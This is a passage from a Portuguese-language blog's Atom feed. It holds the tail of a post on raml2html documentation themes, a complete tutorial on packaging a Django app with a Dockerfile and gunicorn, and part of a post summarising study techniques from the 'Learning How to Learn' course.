&lt;p&gt;Sem dúvida, um dos templates mais legais que temos disponível é o &lt;code&gt;raml2html-slate-theme&lt;/code&gt;.
Completo, e baseado no próprio
&lt;a href="https://github.com/lord/slate" title="Beautiful static documentation for your API"&gt;&lt;em&gt;Slate&lt;/em&gt;&lt;/a&gt;,
famosa ferramenta para criação de documentação de &lt;em&gt;APIs&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/raml2html-example-2.png" width="640" height="341" title="Exemplo de documentação RAML" alt="Exemplo de documentação RAML"&gt;&lt;/p&gt;
&lt;p&gt;Você pode criar o seu próprio template! Eles são escritos utilizando o
&lt;a href="https://mozilla.github.io/nunjucks/" title="A rich and powerful templating language for JavaScript."&gt;&lt;em&gt;Nunjucks&lt;/em&gt;&lt;/a&gt;,
linguagem de templates &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; da &lt;em&gt;Mozilla&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;post&lt;/em&gt; de hoje foi uma dica rápida e rasteira.&lt;/p&gt;
&lt;p&gt;A partir do momento que você pratica o
&lt;a href="https://swaggerhub.com/blog/api-design/design-first-or-code-first-api-development/" title="Design First or Code First: What’s the Best Approach to API Development?"&gt;&lt;em&gt;design first&lt;/em&gt;&lt;/a&gt;,
ter uma especificação &lt;em&gt;RAML&lt;/em&gt; como "single source of truth" é um caminho no mínimo razoável.
Com isso, gerar documentações através de ferramentas como a apresentada nesse artigo torna-se
algo rápido e prático.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="rest"></category><category term="apis"></category><category term="raml"></category><category term="nodejs"></category></entry><entry><title>Uma ode ao Docker - Parte 3</title><link href="https://klauslaube.com.br/2017/08/11/uma-ode-ao-docker-parte-3.html" rel="alternate"></link><published>2017-08-11T18:00:00-03:00</published><updated>2017-08-11T18:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-08-11:/2017/08/11/uma-ode-ao-docker-parte-3.html</id><summary type="html">&lt;p&gt;Nos &lt;a href="https://klauslaube.com.br/2017/01/14/uma-ode-ao-docker-parte-1.html" title="Uma ode ao Docker - Parte 1"&gt;&lt;em&gt;posts&lt;/em&gt;&lt;/a&gt;
&lt;a href="https://klauslaube.com.br/2017/05/01/uma-ode-ao-docker-parte-2.html" title="Uma ode ao Docker - Parte 2"&gt;anteriores&lt;/a&gt;
arranhamos um pouco o conceito por trás do &lt;a href="https://klauslaube.com.br/tag/docker.html" title="Leia mais sobre Docker"&gt;&lt;em&gt;Docker&lt;/em&gt;&lt;/a&gt;,
bem como introduzimos o utilitário de linha de comando &lt;code&gt;docker&lt;/code&gt;. Nesse último artigo da série, vamos
explorar como usar o &lt;em&gt;Dockerfile&lt;/em&gt; no empacotamento de uma aplicação &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Se você ainda tem dúvidas em como "encaixar" o &lt;em&gt;Docker&lt;/em&gt; no …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Nos &lt;a href="https://klauslaube.com.br/2017/01/14/uma-ode-ao-docker-parte-1.html" title="Uma ode ao Docker - Parte 1"&gt;&lt;em&gt;posts&lt;/em&gt;&lt;/a&gt;
&lt;a href="https://klauslaube.com.br/2017/05/01/uma-ode-ao-docker-parte-2.html" title="Uma ode ao Docker - Parte 2"&gt;anteriores&lt;/a&gt;
arranhamos um pouco o conceito por trás do &lt;a href="https://klauslaube.com.br/tag/docker.html" title="Leia mais sobre Docker"&gt;&lt;em&gt;Docker&lt;/em&gt;&lt;/a&gt;,
bem como introduzimos o utilitário de linha de comando &lt;code&gt;docker&lt;/code&gt;. Nesse último artigo da série, vamos
explorar como usar o &lt;em&gt;Dockerfile&lt;/em&gt; no empacotamento de uma aplicação &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Se você ainda tem dúvidas em como "encaixar" o &lt;em&gt;Docker&lt;/em&gt; no seu fluxo de desenvolvimento,
o artigo &lt;a href="http://www.patricksoftwareblog.com/why-i-switched-from-a-traditional-deployment-to-using-docker/" title="Leia na íntegra"&gt;"Why I Switched from a Traditional Deployment to Using Docker"&lt;/a&gt;
pode ser uma boa leitura.&lt;/p&gt;
&lt;h2&gt;Configurando a aplicação Django&lt;/h2&gt;
&lt;p&gt;Vamos configurar uma aplicação de exemplo para sermos capazes de dar os passos necessários
na criação do &lt;code&gt;Dockerfile&lt;/code&gt;. Primeiramente, vamos criar
&lt;em&gt;&lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre virtualenv"&gt;virtualenv&lt;/a&gt; Python&lt;/em&gt; com &lt;a href="https://klauslaube.com.br/tag/pyenv.html" title="Leia mais sobre Pyenv"&gt;&lt;em&gt;pyenv&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pyenv virtualenv &lt;span class="m"&gt;3&lt;/span&gt;.6.1 helloworld-django-docker
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Criamos o diretório para o projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mkdir ~/Workspace/helloworld
$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/Workspace/helloworld/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ativamos o &lt;em&gt;virtualenv&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pyenv activate helloworld-django-docker
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Instalamos as dependências &lt;em&gt;Django&lt;/em&gt; e iniciamos o projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install django gunicorn
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;

$ pip freeze &amp;gt; requirements.txt
$ django-admin startproject helloworld ~/Workspace/helloworld
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Rodamos o &lt;code&gt;python manage.py runserver&lt;/code&gt; só para termos certeza que está tudo ok:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/django-it-worked.png" width="680" height="131" title="It worked" alt="It worked"&gt;&lt;/p&gt;
&lt;p&gt;Além disso, garantimos que o &lt;code&gt;gunicorn&lt;/code&gt; rodará sem maiores problemas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gunicorn helloworld.wsgi:application &lt;span class="se"&gt;\&lt;/span&gt;
    --bind &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8000 &lt;span class="se"&gt;\&lt;/span&gt;
    --workers &lt;span class="m"&gt;3&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para saber mais sobre o &lt;em&gt;Gunicorn&lt;/em&gt;, leia a &lt;a href="http://docs.gunicorn.org/en/stable/design.html" title="Documentação do Gunicorn"&gt;documentação oficial&lt;/a&gt; do projeto.&lt;/p&gt;
&lt;h2&gt;Entra o Dockerfile&lt;/h2&gt;
&lt;p&gt;Com o &lt;a href="https://docs.docker.com/engine/installation/" title="Instalando o Docker"&gt;&lt;em&gt;Docker&lt;/em&gt; instalado&lt;/a&gt;,
vamos começar a escrever o &lt;code&gt;Dockerfile&lt;/code&gt;. O &lt;a href="http://www.mundodocker.com.br/o-que-e-dockerfile/" title="O que é o Dockerfile"&gt;&lt;em&gt;Mundo Docker&lt;/em&gt;&lt;/a&gt; define o arquivo como:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) um arquivo de definição onde é possível realizar ou preparar todo ambiente a
partir de um script de execução. Em resumo, o Dockerfile é um arquivo texto
com instruções, comandos e passos que você executaria manualmente, basicamente
o Docker executa uma receita de bolo.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;É nesse arquivo que escreveremos todos os procedimentos que o &lt;em&gt;Docker&lt;/em&gt; executará para criar
a imagem da nossa aplicação.&lt;/p&gt;
&lt;h3&gt;Por partes, como diria Jack&lt;/h3&gt;
&lt;p&gt;Começamos especificando qual será a "imagem base" da nossa imagem/&lt;em&gt;container&lt;/em&gt;. Faremos isso
através da expressão &lt;code&gt;FROM&lt;/code&gt;. Poderíamos dizer aqui que queremos estender a imagem &lt;a href="https://hub.docker.com/_/debian/" title="Imagem Debian no Dockerhub"&gt;_/debian&lt;/a&gt;
e realizar toda a instalação do &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;.
Mas felizmente já existem imagens prontas com a linguagem no &lt;em&gt;Docker Hub&lt;/em&gt;.
Vamos com a &lt;a href="https://hub.docker.com/_/python/" title="Imagem Python no Docker Hub"&gt;imagem oficial&lt;/a&gt; como base:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;# Dockerfile&lt;/span&gt;

&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; python:3&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Quando "buildarmos", o &lt;em&gt;Docker&lt;/em&gt; baixará a imagem do &lt;em&gt;Python&lt;/em&gt; do repositório (se ela já não existir localmente
em sua máquina), e dará sequência às instruções encontradas no &lt;code&gt;Dockerfile&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Uma boa prática é "fecharmos o escopo" de trabalho ao setar explicitamente qual será o
diretório no qual iremos realizar demais operações como cópia de arquivos ou execução de binários. Para isso
temos o comando &lt;code&gt;WORKDIR&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; python:3&lt;/span&gt;

&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="s"&gt; /usr/src/app&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora podemos instalar o &lt;em&gt;Django&lt;/em&gt; e o &lt;em&gt;Gunicorn&lt;/em&gt;, assim como fizemos no início desse artigo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; python:3&lt;/span&gt;

&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="s"&gt; /usr/src/app&lt;/span&gt;

&lt;span class="k"&gt;COPY&lt;/span&gt; requirements.txt ./
&lt;span class="k"&gt;RUN&lt;/span&gt; pip install -r requirements.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Você já deve ter reparado um padrão na escrita do &lt;code&gt;Dockerfile&lt;/code&gt;, certo? Os comandos (em maiúsculo)
determinam qual operação será realizada. Os parâmetros (em minúsculo) determinam como isso irá ocorrer.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/docker-dory-whale.jpg" width="640" height="320" title="Escrever Dockerfile é tipo falar baleiês (insidethemagic.net)" alt="Escrever Dockerfile é tipo falar baleiês (insidethemagic.net)"&gt;&lt;/p&gt;
&lt;p&gt;No caso do comando &lt;code&gt;COPY&lt;/code&gt;, passamos o arquivo &lt;code&gt;requirements.txt&lt;/code&gt; da nossa "máquina local" para
o &lt;em&gt;container&lt;/em&gt;, assim o &lt;em&gt;Docker&lt;/em&gt; será capaz de encontrar o arquivo e realizar a instalação das dependências
através do comando &lt;code&gt;pip&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Para finalizar, podemos copiar o resto do projeto e executar o servidor &lt;em&gt;WSGI&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="s"&gt; python:3&lt;/span&gt;

&lt;span class="k"&gt;WORKDIR&lt;/span&gt;&lt;span class="s"&gt; /usr/src/app&lt;/span&gt;

&lt;span class="k"&gt;COPY&lt;/span&gt; requirements.txt ./
&lt;span class="k"&gt;RUN&lt;/span&gt; pip install -r requirements.txt

&lt;span class="k"&gt;COPY&lt;/span&gt; . .

&lt;span class="k"&gt;CMD&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gunicorn&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;helloworld.wsgi:application&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;--bind=0.0.0.0:8000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;--workers=3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comandos &lt;code&gt;RUN&lt;/code&gt; serão executados em tempo de &lt;em&gt;build&lt;/em&gt;. São essenciais para a construção do ambiente,
e são responsáveis pelos "layers" discutidos nos &lt;em&gt;posts&lt;/em&gt; anteriores. Portanto é bem comum
vermos comandos como &lt;code&gt;RUN apt-get dist-upgrade -y&lt;/code&gt;. Já o &lt;code&gt;CMD&lt;/code&gt; será executado no momento que a sua
imagem for executada.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://goinbigdata.com/docker-run-vs-cmd-vs-entrypoint/" title="Docker RUN vs CMD vs ENTRYPOINT"&gt;Diferença entre &lt;code&gt;RUN&lt;/code&gt;, &lt;code&gt;CMD&lt;/code&gt; e &lt;code&gt;ENTRYPONT&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;E se você está se perguntando o motivo de termos dois &lt;code&gt;COPY&lt;/code&gt;, essa prática é útil para o mecanismo de &lt;em&gt;caching&lt;/em&gt;
do &lt;em&gt;Docker&lt;/em&gt; e invalidação do mesmo, como pode ser visto no &lt;a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/#add-or-copy" title="Dockerfile best practices"&gt;guia de boas práticas&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;"Build" é quase BIRL!&lt;/h3&gt;
&lt;p&gt;Hora de "buildar"! Execute o seguinte comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker build -t &amp;lt;docker-hub-user&amp;gt;/helloworld-django-docker .
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Onde:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;build&lt;/code&gt;: É o comando para criar uma imagem &lt;em&gt;Docker&lt;/em&gt; a partir de um &lt;em&gt;Dockerfile&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-t&lt;/code&gt;: O parâmetro &lt;code&gt;-t&lt;/code&gt; é utilizado para nomear e tagear a imagem em questão.
  É interessante usar o padrão &lt;code&gt;&amp;lt;usuario-ou-repositorio&amp;gt;/nome-da-imagem&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt;: O caminho onde encontra-se o &lt;em&gt;Dockerfile&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Se tudo der certo, será possível listar a imagem recém criada:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker images

REPOSITORY                         TAG    IMAGE ID
kplaube/helloworld-django-docker   latest b8d3b0c234a9
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora sim seremos capazes de executar a aplicação &lt;em&gt;Django&lt;/em&gt; através de um &lt;em&gt;container&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker run -it -p &lt;span class="m"&gt;8000&lt;/span&gt;:8000 &amp;lt;docker-hub-user&amp;gt;/helloworld-django-docker
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E mais uma vez seremos capazes de ver o "It worked!" em &lt;code&gt;http://localhost:8000&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Belezura! Uma vez que a imagem esteja ok, podemos publicá-la no &lt;em&gt;Docker Hub&lt;/em&gt; (afinal,
propaganda é a alma do negócio):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ docker push &amp;lt;docker-hub-user&amp;gt;/helloworld-django-docker
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E... &lt;em&gt;voilá&lt;/em&gt;! A imagem foi publicada no &lt;a href="https://hub.docker.com/r/kplaube/helloworld-django-docker/"&gt;&lt;em&gt;Docker Hub&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Antes de ir: Efêmero&lt;/h3&gt;
&lt;p&gt;Nos &lt;em&gt;posts&lt;/em&gt; anteriores demos uma pincelada numa das características dos &lt;em&gt;containers&lt;/em&gt;
que é a sua "efemeridade". Isso significa que, a cada nova versão da sua &lt;em&gt;app Django&lt;/em&gt;
você terá que "buildar" uma nova versão da imagem &lt;em&gt;Docker&lt;/em&gt;. A boa notícia é que com
o mecanismo de &lt;em&gt;caching&lt;/em&gt; do &lt;em&gt;Docker&lt;/em&gt; essa operação deverá ser ligeiramente mais
rápida do que da primeira vez.&lt;/p&gt;
&lt;p&gt;Além disso, mesmo que você tenha uma leve camada de escrita ao executar um &lt;em&gt;container&lt;/em&gt;,
a informação será perdida ao parar/reiniciar o mesmo. Portanto, o uso de &lt;a href="https://docs.docker.com/engine/admin/volumes/volumes/" title="Use volumes"&gt;&lt;em&gt;Docker Volumes&lt;/em&gt;&lt;/a&gt;
é essencial quando se faz necessária a persistência de dados.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Com esse &lt;em&gt;post&lt;/em&gt; fechamos essa pequena ode ao &lt;em&gt;Docker&lt;/em&gt;. Sem dúvida, uma ferramenta que vem mudando
paradigmas (o mais recente deles com o &lt;a href="https://www.opencontainers.org/announcement/2017/07/19/open-container-initiative-oci-releases-v1-0-of-container-standards" title="Open Container Initiative (OCI) Releases v1.0 of Container Standards"&gt;lançamento da versão 1.0&lt;/a&gt; do &lt;em&gt;Container Standards&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Pretendo abordar mais sobre &lt;em&gt;Docker&lt;/em&gt; aqui no &lt;em&gt;blog&lt;/em&gt;, principalmente detalhando melhor
o uso do mesmo no &lt;a href="https://klauslaube.com.br/tag/deploy.html" title="Leia mais sobre deploy"&gt;&lt;em&gt;deploy&lt;/em&gt;&lt;/a&gt; de aplicações &lt;em&gt;Django&lt;/em&gt;.
Com a adoção de conteinerização por serviços &lt;em&gt;PaaS&lt;/em&gt; como &lt;em&gt;Heroku&lt;/em&gt; e &lt;em&gt;Openshift&lt;/em&gt;,
há muito assunto a ser explorado nessa seara.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/"&gt;Docker Docs - Best practices for writing Dockerfiles&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://flaviosilveira.com/2017/criando-seu-container-com-dockerfile/"&gt;Flavio Silveira - Criando Seu Container Com Dockerfile&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mundodocker.com.br/o-que-e-dockerfile/"&gt;Mundo Docker - O que é Dockerfile&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.patricksoftwareblog.com/how-to-use-docker-and-docker-compose-to-create-a-flask-application/"&gt;Patrick's Software Blog - How to use Docker and Docker Compose to Create a Flask Application&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://semaphoreci.com/community/tutorials/dockerizing-a-python-django-web-application"&gt;Semaphore - Dockerizing a Python Django web Application&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="infraestrutura"></category><category term="virtualizacao"></category><category term="containerizacao"></category><category term="docker"></category><category term="nginx"></category><category term="python"></category><category term="django"></category></entry><entry><title>Aprendendo a Aprender</title><link href="https://klauslaube.com.br/2017/07/27/aprendendo-a-aprender.html" rel="alternate"></link><published>2017-07-27T20:30:00-03:00</published><updated>2017-07-27T20:30:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-07-27:/2017/07/27/aprendendo-a-aprender.html</id><summary type="html">&lt;p&gt;Já mencionei o "&lt;a href="https://www.coursera.org/learn/aprender" title="Veja o curso em pt-BR"&gt;Aprendendo a Aprender&lt;/a&gt;"
no &lt;em&gt;post&lt;/em&gt; sobre &lt;a href="https://klauslaube.com.br/2017/06/29/pomodoro-ftw.html" title="Leia mais sobre Pomodoro"&gt;&lt;em&gt;Pomodoro&lt;/em&gt;&lt;/a&gt;, e
faço questão de citá-lo sempre que possível. O curso, ministrado por
&lt;a href="https://en.wikipedia.org/wiki/Barbara_Oakley" title="Conheça Barbara"&gt;&lt;em&gt;Barbara Oakley&lt;/em&gt;&lt;/a&gt;,
além de inspirador apresenta uma série de ferramentas que irão te ajudar a aprender
o mais maçante dos conteúdos (e farão bem à sua memória).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Já mencionei o "&lt;a href="https://www.coursera.org/learn/aprender" title="Veja o curso em pt-BR"&gt;Aprendendo a Aprender&lt;/a&gt;"
no &lt;em&gt;post&lt;/em&gt; sobre &lt;a href="https://klauslaube.com.br/2017/06/29/pomodoro-ftw.html" title="Leia mais sobre Pomodoro"&gt;&lt;em&gt;Pomodoro&lt;/em&gt;&lt;/a&gt;, e
faço questão de citá-lo sempre que possível. O curso, ministrado por
&lt;a href="https://en.wikipedia.org/wiki/Barbara_Oakley" title="Conheça Barbara"&gt;&lt;em&gt;Barbara Oakley&lt;/em&gt;&lt;/a&gt;,
além de inspirador apresenta uma série de ferramentas que irão te ajudar a aprender
o mais maçante dos conteúdos (e farão bem à sua memória).&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;O &lt;a href="http://www.abbc.org.br/cursos/artigo.asp?id=7" title="Aprendendo a aprender - 10 regras para estudar bem"&gt;&lt;em&gt;ABBC&lt;/em&gt;&lt;/a&gt;
bem que tentou descrever a tutora:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;É difícil definir uma profissão para Barbara Oakley. Ela se formou em Literatura
e Línguas Eslavas, trabalhou como tradutora no exército americano, até que decidiu
estudar engenharia! Hoje, ela tem um currículo invejável, que passa por disciplinas
tão distantes quanto Letras, Engenharia e Biologia. É PhD, professora de Engenharia
na Universidade de Oakland, em Rochester, Michigan. Sua pesquisa atualmente
se concentra na complexa relação entre neurociência e comportamento social.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;É com esse gabarito todo que &lt;em&gt;Barbara&lt;/em&gt;, acompanhada de
&lt;a href="https://en.wikipedia.org/wiki/Terry_Sejnowski" title="Conheça Terry"&gt;&lt;em&gt;Terrence Sejnowski&lt;/em&gt;&lt;/a&gt;,
dá o curso através da plataforma &lt;em&gt;Coursera&lt;/em&gt;, &lt;strong&gt;totalmente grátis&lt;/strong&gt;.
Mesmo que você (assim como eu) não tenha a pretensão de virar um estudioso, eu super recomendo!&lt;/p&gt;
&lt;p&gt;Abaixo, com ajuda de algumas referências espalhadas pela &lt;em&gt;web&lt;/em&gt;, eu relembro alguns
conceitos que aprendi durante as 4 semanas de curso.&lt;/p&gt;
&lt;h2&gt;Combata a procrastinação&lt;/h2&gt;
&lt;p&gt;Sair de inércia é um desafio imenso (pelo menos pra mim). Não importa o quão
recompensador ou empolgante for a tarefa, meu cérebro entende que ir pro
&lt;em&gt;Netflix&lt;/em&gt; sempre trará resultados maiores.&lt;/p&gt;
&lt;p&gt;É um comportamento comum: Focamos no resultado final, e o resultado final não é
fácil de atingir imediatamente. Ao contrário da satisfação instantânea de assistir a um seriado.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A dica é:&lt;/strong&gt; Foque no processo. Ao invés de "preciso aprender XYZ", prefira
"vou dedicar 1 hora aprendendo XYZ, começando por Y". O (supracitado)
&lt;em&gt;Pomodoro Technique&lt;/em&gt; pode te ajudar com isso.&lt;/p&gt;
&lt;p&gt;E Lembre-se: "Um pouco" é melhor que nada.&lt;/p&gt;
&lt;h2&gt;Aprenda de forma ativa&lt;/h2&gt;
&lt;p&gt;Procure relembrar! Nem só ler, ou copiar, ou ainda usar "caneta marca texto".
Quantos livros você já leu e tava tão focado em acabá-lo que semanas depois não
era mais capaz de lembrar dos detalhes da trama?&lt;/p&gt;
&lt;p&gt;Absorver o conteúdo de forma passiva é outra "traquinagem" do nosso cérebro.
A sensação de progresso é reconfortante, mas outra vez estamos cometendo o pecado
de focar no resultado final e não no processo.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A dica é:&lt;/strong&gt; Relembre. Explique o que você acabou de aprender para você mesmo ou
algum amigo. Relembre as principais ideias em um lugar diferente daquele no qual você costuma aprender.&lt;/p&gt;
&lt;p&gt;E por mais clichê que possa parecer, teste os seus conhecimentos. Isso será
crucial para que você seja capaz de revisitar pontos dos quais ainda possui dúvidas.&lt;/p&gt;
&lt;h2&gt;"Indexe" o conteúdo que você está aprendendo&lt;/h2&gt;
&lt;p&gt;Para aprender a tocar uma música, é mais fácil separá-la em partes (intro, verso, refrão, etc)
e praticar parte por parte, até que você seja capaz de "amarrá-las" e tocá-la por inteiro.&lt;/p&gt;
&lt;p&gt;Podemos usar a mesma analogia (e fazer analogias é uma boa ferramenta para entender conteúdos)
para o processo de aprendizado como um todo: É mais eficaz quebrarmos um
determinado tema em conteúdos menores e iterativamente aprendê-los.&lt;/p&gt;
&lt;p&gt;Voltando ao exemplo da música. Quando estamos aprendendo a tocar o refrão
nossa memória de curto prazo (que tem pouco poder de armazenamento) é completamente
preenchida pelos acordes que o compõe. Através da repetição, conseguimos
"dar significado" àquele bloco até chegar o momento em que não pensamos
mais nos acordes em si, e sim no "bloco como um todo".&lt;/p&gt;
&lt;p&gt;Trazendo pro lado da &lt;em&gt;TI&lt;/em&gt;, é quase como "zipar" o conhecimento e indexá-lo em
um banco de dados (que seria a nossa memória de longo prazo) através de uma
chave que faça muito sentido para nós.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A dica é:&lt;/strong&gt; Use analogias para dar maior significado a um determinado assunto.
Separe o conteúdo em pequenos grupos e aplique o processo de aprendizagem para cada um.&lt;/p&gt;
&lt;p&gt;E não envergonhe-se de técnicas como "bem/mal, bom/mau".&lt;/p&gt;
&lt;h2&gt;Aprenda de forma espaçada&lt;/h2&gt;
&lt;p&gt;Por mais surpreendente que possa parecer, estudar 10 horas num dia não vai te
deixar mais preparado para uma prova que ocorrerá no dia seguinte, do que
estudar 1 hora em 10 dias. Isso segundo &lt;a href="https://www.theguardian.com/education/2009/feb/13/gcses-teaching" title="A sixth of a GCSE in 60 minutes?"&gt;&lt;em&gt;Douglas Fields&lt;/em&gt;&lt;/a&gt;,
que propõe que através de aprendizagem espaçada a informação entra de maneira
mais fácil na &lt;a href="https://drauziovarella.com.br/corpo-humano/memoria/" title="Memória"&gt;memória de longo prazo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Além disso, seu cérebro precisa de descanso. Estudar horas a fio ou negligenciar
noites de sono pode trazer malefícios à saúde e principalmente ao seu
processo de aprendizagem. É através do sono, por exemplo, que o seu cérebro passa
por um "período de manutenção", eliminando toxinas, fortalecendo memórias importantes
e descartando as menos importantes.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/social-network-algorithm.jpg" width="640" height="360" title="Cursos de algorítmos do Coursera te farão querer afundar a cara nos livros (blogossus.com)" alt="Cursos de algorítmos do Coursera te farão querer afundar a cara nos livros (blogossus.com)"&gt;&lt;/p&gt;
&lt;p&gt;E quando você faz uma pausa, o cérebro entra no famigerado
&lt;a href="https://pt.coursera.org/learn/aprender/lecture/IeefW/introducao-aos-modos-difuso-e-focado" title="Introdução aos Modos Difuso e Focado"&gt;"modo difuso"&lt;/a&gt;.
Que pode ser (vulgarmente) explicado como ele trabalhando em segundo plano para
construir novos padrões neurais, ajudando-o a resolver problemas complexos, ter
novas ideias ou entender algo melhor.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A dica é:&lt;/strong&gt; Ao invés de estudar 5 horas nas quartas-feiras, estude 1 hora 5x na semana.
Descanse, faça pausas durante os estudos (olha o &lt;em&gt;Pomodoro&lt;/em&gt; aí de novo),
